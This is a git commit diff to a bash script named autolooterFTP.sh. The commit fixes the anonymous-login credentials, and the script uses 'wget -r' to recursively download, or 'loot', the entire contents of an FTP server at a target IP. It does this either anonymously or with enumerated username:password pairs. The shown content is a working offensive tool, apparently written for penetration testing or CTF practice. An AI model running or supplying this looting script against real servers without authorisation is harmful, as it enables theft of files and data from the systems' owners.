6822539eddf5d61a1ee0ff56955cbf5fa422a929
truth <mkthun@protonmail.com>
2023-09-01 21:16:28 +0100

    Fixed FTPautolooter password for anonymous yikes

--- bash/autolooterFTP.sh
+++ bash/autolooterFTP.sh
@@ -7,7 +7,7 @@ while true; do
 
 	read -r -p "Enter (1) for Anonymous login or (2) to specify username: " USERRSP
         case $USERRSP in
-                [1]* ) wget -r ftp://Anonymous: @$IP/; wait; echo "Completed looting the Anonymous FTP login"; echo; break ;;
+                [1]* ) wget -r ftp://anonymous:anonymous@$IP/; wait; echo "Completed looting the Anonymous FTP login"; echo; break ;;
                 [2]* ) read -r -p "Enter <username>:<password> delimited with colon: " USERPASS; wait; wget -r ftp://$USERPASS@$IP/; wait; echo "Completed looting the enumerated FTP user login"; echo; break;;
                 * ) echo "Please enter 1 or 2.";;
         esac
